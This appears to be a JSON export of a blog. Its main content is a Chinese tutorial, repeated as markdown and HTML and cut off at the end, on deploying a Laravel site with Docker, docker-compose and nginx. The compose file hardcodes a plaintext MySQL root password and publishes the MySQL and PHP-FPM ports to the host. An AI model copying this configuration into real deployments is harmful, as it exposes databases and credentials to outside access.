target=\"_blank\" rel=\"noopener\">https://elementaryos.stackexchange.com/questions/2716/error-in-grub-minimal-bash-like-line-editing-is-supported-for</a></p>\n"},{"title":"php laravel使用docker部署","date":"2018-04-21T12:01:46.000Z","_content":"\n### 前言\n\n使用的云服务器到期了，买的时候打折的力度的比较大，但是续费的时候就非常昂贵了，只得\b用新用户换一家厂商的云服务器。但是可怕的问题就来了，我又得重新搭建一次开发环境。每次搭建php的开发环境都十分麻烦。为了下一次被迫迁移方便一点，我果断\b决定用docker来部署我的小站点，也方便下一次迁移，所以特意\b记录一下我的操作流程，其中还是有一些需要注意的问题。我就遇到了一些奇怪的问题。\n\n### 操作步骤：\n\n1.制作镜像。\n\n\bnginx和mysql都直接使用官方镜像就好，不需要特殊操作。php可能需要安装一些第三方php扩展，我使用\b的是laravel框架，因此需要一些php扩展。其它框架，可能需要根据情况，\b安装一些其它扩展。php的Dockerfile如下\n\n```\nFROM php:7.2-fpm\nRUN apt-get update && apt-get install -y \\\n        libfreetype6-dev \\\n        libjpeg62-turbo-dev \\\n        libpng-dev \\\n    && docker-php-ext-install -j$(nproc) iconv \\\n    && docker-php-ext-configure gd --with-freetype-dir=/usr/include/ --with-jpeg-dir=/usr/include/ \\\n    && docker-php-ext-install -j$(nproc) gd &&  docker-php-ext-install pdo_mysql \\\n    && docker-php-ext-install zip\n```\n其它扩展安装参考官方说明https://hub.docker.com/_/php/\n\n2.配置docker-compose文件\n\n我是用的docker-compose去启动整个镜像，docker-compose.yml文件如下\n```\nversion: '2.2'\n\nservices:\n\n  nginx:\n    image: nginx:1.15.2-alpine\n    hostname: nginx\n    container_name: nginx\n    volumes:\n      - /var/www:/var/www\n      - ./nginx.conf:/etc/nginx/nginx.conf:ro\n    ports:\n      - 80:80\n      - 443:443\n\n  php:\n    image: registry.cn-hangzhou.aliyuncs.com/fzy/php7.2\n    hostname: php\n    container_name: php-7.2\n    volumes:\n      - /var/www:/var/www\n    ports:\n      - 9000:9000\n\n  mysql:\n    image: mysql:5.6\n    environment:\n      MYSQL_ROOT_PASSWORD: 520520fzy\n    volumes:\n      - /var/mysql-data:/var/lib/mysql\n    ports:\n      - 3306:3306\n```\n这里需要注意的是，nginx和php都需要映射到外界目录。\n\n3.修改nginx.conf文件\n\n将php迁移到docker部署，nginx.conf的配置文件跟我们平常是使用的还是有些不太一样。\n\n```\nuser nginx;\nworker_processes auto;\nerror_log /var/log/nginx/error.log;\npid /run/nginx.pid;\n\n# Load dynamic modules. See /usr/share/nginx/README.dynamic.\ninclude /usr/share/nginx/modules/*.conf;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n                      '$status $body_bytes_sent \"$http_referer\" '\n                      '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    access_log  /var/log/nginx/access.log  main;\n\n    sendfile            on;\n    tcp_nopush          on;\n    tcp_nodelay         on;\n    keepalive_timeout   65;\n    types_hash_max_size 2048;\n\n    include             /etc/nginx/mime.types;\n    default_type        application/octet-stream;\n\n    # Load modular configuration files from the /etc/nginx/conf.d directory.\n    # See http://nginx.org/en/docs/ngx_core_module.html#include\n    # for more information.\n    include /etc/nginx/conf.d/*.conf;\n\n    server {\n        listen       80 default_server;\n        listen       [::]:80 default_server;\n        server_name  test1.sleepan.com;\n        root         /var/www/html;\n        index        index.php index.html index.htm;\n        # Load configuration files for the default server block.\n        include /etc/nginx/default.d/*.conf;\n\n        location / {\n           try_files $uri $uri/ =404;\n           client_max_body_size  500m;\n        }\n\n        error_page 404 /404.html;\n            location = /40x.html {\n        }\n\n        error_page 500 502 503 504 /50x.html;\n          location = /50x.html {\n       }\n\tlocation ~ \\.php$ {\n\n          fastcgi_index   index.php;\n          fastcgi_pass    php:9000;\n          fastcgi_param   SCRIPT_FILENAME    /var/www/html$fastcgi_script_name;\n          fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;\n          include         fastcgi_params;\n          client_max_body_size  500m;\n       }\n    }\n}\n```\n\n```\nfastcgi_pass    php:9000;\n```\n这一行，原本我们在物理机的时候，是写成 127.0.0.1:9000，但是启用docker后，php和nginx有各自的网络地址，因此这里要改为php。因为我们使用了docker-compose部署，这里的php指向的就是我们部署php所在docker的\b地址。\n\n4.启动\n\n需要在docker-compose.yml的同级目录下，执行docker-compose up -d这个命令，去启动\b容器。关闭容器可用命令docker-compose down命令。","source":"_posts/php-larvel-docker部署.md","raw":"---\ntitle: php laravel使用docker部署\ndate: 2018-04-21 20:01:46\ntags: php linux docker\n---\n\n### 前言\n\n使用的云服务器到期了，买的时候打折的力度的比较大，但是续费的时候就非常昂贵了，只得\b用新用户换一家厂商的云服务器。但是可怕的问题就来了，我又得重新搭建一次开发环境。每次搭建php的开发环境都十分麻烦。为了下一次被迫迁移方便一点，我果断\b决定用docker来部署我的小站点，也方便下一次迁移，所以特意\b记录一下我的操作流程，其中还是有一些需要注意的问题。我就遇到了一些奇怪的问题。\n\n### 操作步骤：\n\n1.制作镜像。\n\n\bnginx和mysql都直接使用官方镜像就好，不需要特殊操作。php可能需要安装一些第三方php扩展，我使用\b的是laravel框架，因此需要一些php扩展。其它框架，可能需要根据情况，\b安装一些其它扩展。php的Dockerfile如下\n\n```\nFROM php:7.2-fpm\nRUN apt-get update && apt-get install -y \\\n        libfreetype6-dev \\\n        libjpeg62-turbo-dev \\\n        libpng-dev \\\n    && docker-php-ext-install -j$(nproc) iconv \\\n    && docker-php-ext-configure gd --with-freetype-dir=/usr/include/ --with-jpeg-dir=/usr/include/ \\\n    && docker-php-ext-install -j$(nproc) gd &&  docker-php-ext-install pdo_mysql \\\n    && docker-php-ext-install zip\n```\n其它扩展安装参考官方说明https://hub.docker.com/_/php/\n\n2.配置docker-compose文件\n\n我是用的docker-compose去启动整个镜像，docker-compose.yml文件如下\n```\nversion: '2.2'\n\nservices:\n\n  nginx:\n    image: nginx:1.15.2-alpine\n    hostname: nginx\n    container_name: nginx\n    volumes:\n      - /var/www:/var/www\n      - ./nginx.conf:/etc/nginx/nginx.conf:ro\n    ports:\n      - 80:80\n      - 443:443\n\n  php:\n    image: registry.cn-hangzhou.aliyuncs.com/fzy/php7.2\n    hostname: php\n    container_name: php-7.2\n    volumes:\n      - /var/www:/var/www\n    ports:\n      - 9000:9000\n\n  mysql:\n    image: mysql:5.6\n    environment:\n      MYSQL_ROOT_PASSWORD: 520520fzy\n    volumes:\n      - /var/mysql-data:/var/lib/mysql\n    ports:\n      - 3306:3306\n```\n这里需要注意的是，nginx和php都需要映射到外界目录。\n\n3.修改nginx.conf文件\n\n将php迁移到docker部署，nginx.conf的配置文件跟我们平常是使用的还是有些不太一样。\n\n```\nuser nginx;\nworker_processes auto;\nerror_log /var/log/nginx/error.log;\npid /run/nginx.pid;\n\n# Load dynamic modules. See /usr/share/nginx/README.dynamic.\ninclude /usr/share/nginx/modules/*.conf;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n                      '$status $body_bytes_sent \"$http_referer\" '\n                      '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    access_log  /var/log/nginx/access.log  main;\n\n    sendfile            on;\n    tcp_nopush          on;\n    tcp_nodelay         on;\n    keepalive_timeout   65;\n    types_hash_max_size 2048;\n\n    include             /etc/nginx/mime.types;\n    default_type        application/octet-stream;\n\n    # Load modular configuration files from the /etc/nginx/conf.d directory.\n    # See http://nginx.org/en/docs/ngx_core_module.html#include\n    # for more information.\n    include /etc/nginx/conf.d/*.conf;\n\n    server {\n        listen       80 default_server;\n        listen       [::]:80 default_server;\n        server_name  test1.sleepan.com;\n        root         /var/www/html;\n        index        index.php index.html index.htm;\n        # Load configuration files for the default server block.\n        include /etc/nginx/default.d/*.conf;\n\n        location / {\n           try_files $uri $uri/ =404;\n           client_max_body_size  500m;\n        }\n\n        error_page 404 /404.html;\n            location = /40x.html {\n        }\n\n        error_page 500 502 503 504 /50x.html;\n          location = /50x.html {\n       }\n\tlocation ~ \\.php$ {\n\n          fastcgi_index   index.php;\n          fastcgi_pass    php:9000;\n          fastcgi_param   SCRIPT_FILENAME    /var/www/html$fastcgi_script_name;\n          fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;\n          include         fastcgi_params;\n          client_max_body_size  500m;\n       }\n    }\n}\n```\n\n```\nfastcgi_pass    php:9000;\n```\n这一行，原本我们在物理机的时候，是写成 127.0.0.1:9000，但是启用docker后，php和nginx有各自的网络地址，因此这里要改为php。因为我们使用了docker-compose部署，这里的php指向的就是我们部署php所在docker的\b地址。\n\n4.启动\n\n需要在docker-compose.yml的同级目录下，执行docker-compose up -d这个命令，去启动\b容器。关闭容器可用命令docker-compose down命令。","slug":"php-larvel-docker部署","published":1,"updated":"2018-08-19T08:29:12.283Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gci000dak9cg3gedgr9","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>使用的云服务器到期了，买的时候打折的力度的比较大，但是续费的时候就非常昂贵了，只得\b用新用户换一家厂商的云服务器。但是可怕的问题就来了，我又得重新搭建一次开发环境。每次搭建php的开发环境都十分麻烦。为了下一次被迫迁移方便一点，我果断\b决定用docker来部署我的小站点，也方便下一次迁移，所以特意\b记录一下我的操作流程，其中还是有一些需要注意的问题。我就遇到了一些奇怪的问题。</p>\n<h3 id=\"操作步骤：\"><a href=\"#操作步骤：\" class=\"headerlink\" title=\"操作步骤：\"></a>操作步骤：</h3><p>1.制作镜像。</p>\n<p>\bnginx和mysql都直接使用官方镜像就好，不需要特殊操作。php可能需要安装一些第三方php扩展，我使用\b的是laravel框架，因此需要一些php扩展。其它框架，可能需要根据情况，\b安装一些其它扩展。php的Dockerfile如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FROM php:7.2-fpm</span><br><span class=\"line\">RUN apt-get update &amp;&amp; apt-get install -y \\</span><br><span class=\"line\">        libfreetype6-dev \\</span><br><span class=\"line\">        libjpeg62-turbo-dev \\</span><br><span class=\"line\">        libpng-dev \\</span><br><span class=\"line\">    &amp;&amp; docker-php-ext-install -j$(nproc) iconv \\</span><br><span class=\"line\">    &amp;&amp; docker-php-ext-configure gd --with-freetype-dir&#x3D;&#x2F;usr&#x2F;include&#x2F; --with-jpeg-dir&#x3D;&#x2F;usr&#x2F;include&#x2F; \\</span><br><span class=\"line\">    &amp;&amp; docker-php-ext-install -j$(nproc) gd &amp;&amp;  docker-php-ext-install pdo_mysql \\</span><br><span class=\"line\">    &amp;&amp; docker-php-ext-install zip</span><br></pre></td></tr></table></figure>\n<p>其它扩展安装参考官方说明<a href=\"https://hub.docker.com/_/php/\" target=\"_blank\" rel=\"noopener\">https://hub.docker.com/_/php/</a></p>\n<p>2.配置docker-compose文件</p>\n<p>我是用的docker-compose去启动整个镜像，docker-compose.yml文件如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &#39;2.2&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\"></span><br><span class=\"line\">  nginx:</span><br><span class=\"line\">    image: nginx:1.15.2-alpine</span><br><span class=\"line\">    hostname: nginx</span><br><span class=\"line\">    container_name: nginx</span><br><span class=\"line\">    volumes:</span><br><span class=\"line\">      - &#x2F;var&#x2F;www:&#x2F;var&#x2F;www</span><br><span class=\"line\">      - .&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf:ro</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 80:80</span><br><span class=\"line\">      - 443:443</span><br><span class=\"line\"></span><br><span class=\"line\">  php:</span><br><span class=\"line\">    image: registry.cn-hangzhou.aliyuncs.com&#x2F;fzy&#x2F;php7.2</span><br><span class=\"line\">    hostname: php</span><br><span class=\"line\">    container_name: php-7.2</span><br><span class=\"line\">    volumes:</span><br><span class=\"line\">      - &#x2F;var&#x2F;www:&#x2F;var&#x2F;www</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 9000:9000</span><br><span class=\"line\"></span><br><span class=\"line\">  mysql:</span><br><span class=\"line\">    image: mysql:5.6</span><br><span class=\"line\">    environment:</span><br><span class=\"line\">      MYSQL_ROOT_PASSWORD: 520520fzy</span><br><span class=\"line\">    volumes:</span><br><span class=\"line\">      - &#x2F;var&#x2F;mysql-data:&#x2F;var&#x2F;lib&#x2F;mysql</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 3306:3306</span><br></pre></td></tr></table></figure>\n<p>这里需要注意的是，nginx和php都需要映射到外界目录。</p>\n<p>3.修改nginx.conf文件</p>\n<p>将php迁移到docker部署，nginx.conf的配置文件跟我们平常是使用的还是有些不太一样。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">user nginx;</span><br><span class=\"line\">worker_processes auto;</span><br><span class=\"line\">error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</span><br><span class=\"line\">pid &#x2F;run&#x2F;nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\"># Load dynamic modules. See &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;README.dynamic.</span><br><span class=\"line\">include &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;modules&#x2F;*.conf;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections 1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;</span><br><span class=\"line\">                      &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;</span><br><span class=\"line\">                      &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">    access_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile            on;</span><br><span class=\"line\">    tcp_nopush          on;</span><br><span class=\"line\">    tcp_nodelay         on;</span><br><span class=\"line\">    keepalive_timeout   65;</span><br><span class=\"line\">    types_hash_max_size 2048;</span><br><span class=\"line\"></span><br><span class=\"line\">    include             &#x2F;etc&#x2F;nginx&#x2F;mime.types;</span><br><span class=\"line\">    default_type        application&#x2F;octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    # Load modular configuration files from the &#x2F;etc&#x2F;nginx&#x2F;conf.d directory.</span><br><span class=\"line\">    # See http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;ngx_core_module.html#include</span><br><span class=\"line\">    # for more information.</span><br><span class=\"line\">    include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class=\"line\"></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen       80 default_server;</span><br><span class=\"line\">        listen       [::]:80 default_server;</span><br><span class=\"line\">        server_name  test1.sleepan.com;</span><br><span class=\"line\">        root         &#x2F;var&#x2F;www&#x2F;html;</span><br><span class=\"line\">        index        index.php index.html index.htm;</span><br><span class=\"line\">        # Load configuration files for the default server block.</span><br><span class=\"line\">        include &#x2F;etc&#x2F;nginx&#x2F;default.d&#x2F;*.conf;</span><br><span class=\"line\"></span><br><span class=\"line\">        location &#x2F; &#123;</span><br><span class=\"line\">           try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class=\"line\">           client_max_body_size  500m;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        error_page 404 &#x2F;404.html;</span><br><span class=\"line\">            location &#x3D; &#x2F;40x.html &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        error_page 500 502 503 504 &#x2F;50x.html;</span><br><span class=\"line\">          location &#x3D; &#x2F;50x.html &#123;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">\tlocation ~ \\.php$ &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">          fastcgi_index   index.php;</span><br><span class=\"line\">          fastcgi_pass    php:9000;</span><br><span class=\"line\">          fastcgi_param   SCRIPT_FILENAME    &#x2F;var&#x2F;www&#x2F;html$fastcgi_script_name;</span><br><span class=\"line\">          fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;</span><br><span class=\"line\">          include         fastcgi_params;</span><br><span class=\"line\">          client_max_body_size  500m;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fastcgi_pass    php:9000;</span><br></pre></td></tr></table></figure>\n<p>这一行，原本我们在物理机的时候，是写成 127.0.0.1:9000，但是启用docker后，php和nginx有各自的网络地址，因此这里要改为php。因为我们使用了docker-compose部署，这里的php指向的就是我们部署php所在docker的\b地址。</p>\n<p>4.启动</p>\n<p>需要在docker-compose.yml的同级目录下，执行docker-compose up -d这个命令，去启动\b容器。关闭容器可用命令docker-compose down命令。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>使用的云服务器到期了，买的时候打折的力度的比较大，但是续费的时候就非常昂贵了，只得\b用新用户换一家厂商的云服务器。但是可怕的问题就来了，我又得重新搭建一次开发环境。每次搭建php的开发环境都十分麻烦。为了下一次被迫迁移方便一点，我果断\b决定用docker来部署我的小站点，也方便下一次迁移，所以特意\b记录一下我的操作流程，其中还是有一些需要注意的问题。我就遇到了一些奇怪的问题。</p>\n<h3 id=\"操作步骤：\"><a href=\"#操作步骤：\" class=\"headerlink\" title=\"操作步骤：\"></a>操作步骤：</h3><p>1.制作镜像。</p>\n<p>\bnginx和mysql都直接使用官方镜像就好，不需要特殊操作。php可能需要安装一些第三方php扩展，我使用\b的是laravel框架，因此需要一些php扩展。其它框架，可能需要根据情况，\b安装一些其它扩展。php的Dockerfile如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FROM php:7.2-fpm</span><br><span class=\"line\">RUN apt-get update &amp;&amp; apt-get install -y \\</span><br><span class=\"line\">        libfreetype6-dev \\</span><br><span class=\"line\">        libjpeg62-turbo-dev \\</span><br><span class=\"line\">        libpng-dev \\</span><br><span class=\"line\">    &amp;&amp; docker-php-ext-install -j$(nproc) iconv \\</span><br><span class=\"line\">    &amp;&amp; docker-php-ext-configure gd --with-freetype-dir&#x3D;&#x2F;usr&#x2F;include&#x2F; --with-jpeg-dir&#x3D;&#x2F;usr&#x2F;include&#x2F; \\</span><br><span class=\"line\">    &amp;&amp; docker-php-ext-install -j$(nproc) gd &amp;&amp;  docker-php-ext-install pdo_mysql \\</span><br><span class=\"line\">    &amp;&amp; docker-php-ext-install zip</span><br></pre></td></tr></table></figure>\n<p>其它扩展安装参考官方说明<a href=\"https://hub.docker.com/_/php/\" target=\"_blank\" rel=\"noopener\">https://hub.docker.com/_/php/</a></p>\n<p>2.配置docker-compose文件</p>\n<p>我是用的docker-compose去启动整个镜像，docker-compose.yml文件如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &#39;2.2&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\"></span><br><span class=\"line\">  nginx:</span><br><span class=\"line\">    image: nginx:1.15.2-alpine</span><br><span class=\"line\">    hostname: nginx</span><br><span class=\"line\">    container_name: nginx</span><br><span class=\"line\">    volumes:</span><br><span class=\"line\">      - &#x2F;var&#x2F;www:&#x2F;var&#x2F;www</span><br><span class=\"line\">      - .&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf:ro</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 80:80</span><br><span class=\"line\">      - 443:443</span><br><span class=\"line\"></span><br><span class=\"line\">  php:</span><br><span class=\"line\">    image: registry.cn-hangzhou.aliyuncs.com&#x2F;fzy&#x2F;php7.2</span><br><span class=\"line\">    hostname: php</span><br><span class=\"line\">    container_name: php-7.2</span><br><span class=\"line\">    volumes:</span><br><span class=\"line\">      - &#x2F;var&#x2F;www:&#x2F;var&#x2F;www</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 9000:9000</span><br><span class=\"line\"></span><br><span class=\"line\">  mysql:</span><br><span class=\"line\">    image: mysql:5.6</span><br><span class=\"line\">    environment:</span><br><span class=\"line\">      MYSQL_ROOT_PASSWORD: 520520fzy</span><br><span class=\"line\">    volumes:</span><br><span class=\"line\">      - &#x2F;var&#x2F;mysql-data:&#x2F;var&#x2F;lib&#x2F;mysql</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 3306:3306</span><br></pre></td></tr></table></figure>\n<p>这里需要注意的是，nginx和php都需要映射到外界目录。</p>\n<p>3.修改nginx.conf文件</p>\n<p>将php迁移到docker部署，nginx.conf的配置文件跟我们平常是使用的还是有些不太一样。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">user nginx;</span><br><span class=\"line\">worker_processes auto;</span><br><span class=\"line\">error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</span><br><span class=\"line\">pid &#x2F;run&#x2F;nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\"># Load dynamic modules. See &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;README.dynamic.</span><br><span class=\"line\">include &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;modules&#x2F;*.conf;</span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections 1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;</span><br><span class=\"line\">                      &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;</span><br><span class=\"line\">                      &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">    access_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile            on;</span><br><span class=\"line\">    tcp_nopush          on;</span><br><span class=\"line\">    tcp_nodelay         on;</span><br><span class=\"line\">    keepalive_timeout   65;</span><br><span class=\"line\">    types_hash_max_size 2048;</span><br><span class=\"line\"></span><br><span class=\"line\">    include             &#x2F;etc&#x2F;nginx&#x2F;mime.types;</span><br><span class=\"line\">    default_type        application&#x2F;octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    # Load modular configuration files from the &#x2F;etc&#x2F;nginx&#x2F;conf.d directory.</span><br><span class=\"line\">    # See http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;ngx_core_module.html#include</span><br><span class=\"line\">    # for more information.</span><br><span class=\"line\">    include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class=\"line\"></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen       80 default_server;</span><br><span class=\"line\">        listen       [::]:80 default_server;</span><br><span class=\"line\">        server_name  test1.sleepan.com;</span><br><span class=\"line\">        root         &#x2F;var&#x2F;www&#x2F;html;</span><br><span class=\"line\">        index        index.php index.html index.htm;</span><br><span 